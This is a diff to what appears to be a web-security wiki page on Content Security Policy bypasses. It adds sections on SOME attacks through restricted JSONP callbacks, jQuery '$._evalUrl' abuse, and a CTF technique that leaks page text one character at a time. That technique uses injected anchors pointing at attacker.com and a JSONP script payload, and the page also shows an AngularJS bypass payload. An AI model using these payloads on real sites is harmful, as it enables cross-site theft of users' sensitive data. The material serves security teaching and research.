@@ -183,7 +183,62 @@ Some more ambiguous types are allowed, however, like `text/plain`, `text/html` o
 
 An application may sanitize uploaded files by checking for a few signatures if it looks like a valid PNG, JPEG, GIF, etc. file which can limit exploitability as it still needs to be valid JavaScript code without `SyntaxError`s. In these cases, you can try to make a **"polyglot"** that passes the validation checks of the server, while remaining valid JavaScript by using the file format in a smart way and language features like comments to remove unwanted code.&#x20;
 
-Another idea instead of _storing_ data, is **reflecting** data. If there is any page that generates a response you can turn into valid JavaScript code, you may be able to abuse it for your payload. [JSONP](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) or other callback endpoints are also useful here as they always have the correct `Content-Type`, and may allow you to insert arbitrary code in place of the `?callback=` parameter, serving as your reflection of valid JavaScript code.&#x20;
+Another idea instead of _storing_ data, is **reflecting** data. If there is any page that generates a response you can turn into valid JavaScript code, you may be able to abuse it for your payload. [JSONP](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) or other callback endpoints are also useful here as they always have the correct `Content-Type`, and may allow you to insert arbitrary code in place of the `?callback=` parameter, serving as your reflection of valid JavaScript code.
+
+### SOME attack
+
+Not all callback parameters are equal. Most nowadays restrict the possible characters, so you should fuzz exactly what character are and aren't allowed.
+
+In case only `[a-zA-Z.]` is allowed, arbitrary JavaScript is not possible. However, you can still access certain elements through properties and then call methods like [`.click()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/click) to submit forms. Even on other pages through `opener`. This is called the SOME attack, with a generator below:
+
+{% embed url="https://someattack.com/Playground/About" %}
+
+***
+
+If _jQuery_ exists on the page and `$` & `_` are allowed (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), you can call [`$._evalUrl()`](https://github.com/jquery/jquery/blob/main/src/manipulation/_evalUrl.js) which evaluates the current page's content as JavaScript if there is no argument. It does so by **fetching the current** `location.href` and then putting its content in a `<script>` tag.\
+It can be useful when:
+
+1. You have a URL that returns valid JavaScript content, but with the wrong content type/nosniff
+2. The URL can be turned into a jQuery-enabled page, for example, by sending a POST request to receive an error page (without changing the URL)
+3. That page should have a more lax CSP that allows inline scripts or `strict-dynamic`
+
+Using the SOME page, you'll be able to call `opener.$._evalUrl` to make it fetch itself with a GET request, which returns some malicious content, and then gets executed.
+
+Note that this is a very specific technique where a lot of preconditions are required, but the same ideas may be able to be applied elsewhere.
+
+***
+
+With `[` & `]` characters allowed, and nesting of them (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), another really powerful primitive becomes available: variable member access. With this you can program a tiny bit of logic in JavaScript to not only call a function, but call different functions depending on certain conditions.
+
+One unintended solution by [@realansgar](https://bsky.app/profile/realansgar.dev) to the _idekCTF 2025 - jnotes_ challenge was using a limited HTML injection to create a list of anchor tags with unique IDs:
+
+```html
+<a id="a" href="https://attacker.com/a" target="top">
+<a id="b" href="https://attacker.com/b" target="top">
+<a id="c" href="https://attacker.com/c" target="top">
+...
+```
+
+Then, we can find some text we want to leak, and access it through common SOME techniques and `innerText` (note `children[42]` allows you to take some shortcuts). You can extract the first character of the text on the page you want to leak using `.innerText[0]`.\
+Now the trick is, we can access `window[...]` with the character returned from this, and if it matches any `id=` of the `<a>` tags we created, we will have a reference to that specific link. Finally, executing the `.click()` method on that will visit the link, leaking the first character.
+
+For example, let's say `body.children[0].textContent[0]` contains some sensitive information. We would inject all the anchor tags as above for all possible characters in this text, then add the following script tag to the exploit:
+
+{% code overflow="wrap" %}
+```python
+<script src="/jsonp?callback=window[top.opener.document.body.children[0].textContent[0]].click">
+```
+{% endcode %}
+
+This code will be evaluated as follows:
+
+1. `window[top.opener.document.body.children[0].textContent[0]].click()`
+2. `window['SECRET'[0]].click()`
+3. `window['S'].click()`
+4. `<a id="S" href="https://attacker.com/S">` is clicked
+5. Browser navigates to [https://attacker.com/S](https://attacker.com/S), first character is leaked to the attacker
+
+Then simply continue for `.innerText[1]`, `.innerText[2]`, etc. until the whole string is leaked.
 
 ### CDNs in `script-src` (AngularJS Bypass + JSONP)
 
@@ -205,9 +260,9 @@ The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com
 </strong><strong>&#x3C;div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}&#x3C;/div>
 </strong></code></pre>
 
-Loading any of these blocks in a CSP that allows it, will trigger the `alert(document.domain)` function. A common pattern for finding these bypasses is using Angular to create an environment where code can be executed from **event handlers**, and then another library or callback function to **click** on the element, triggering the handler with your malicious code.&#x20;
+Loading any of these blocks in a CSP that allows it, will trigger the `alert(document.domain)` function. A common pattern for finding these bypasses is using Angular to create an environment where code can be executed from **event handlers**, and then another library or callback function to **click** on the element, triggering the handler with your malicious code.
 
-See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.&#x20;
+See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.
 
 {% embed url="https://cspbypass.com/" %}
 Public list of Angular/JSONP gadgets for CSP Bypasses
@@ -222,6 +277,12 @@ Knockout, Ajaxify, Bootstrap, Google Closure, RequireJS, Ember, jQuery, jQuery M
 
 {% embed url="https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md" %}
 Table of bypasses and PoCs
+{% endembed %}
+
+The following site collects more general script gadgets in various libraries that companies may host:
+
+{% embed url="https://gmsgadget.com/" %}
+List of generic gadgets in common libraries, mostly focused on HTML
 {% endembed %}
 
 ### Redirect to unrestricted path
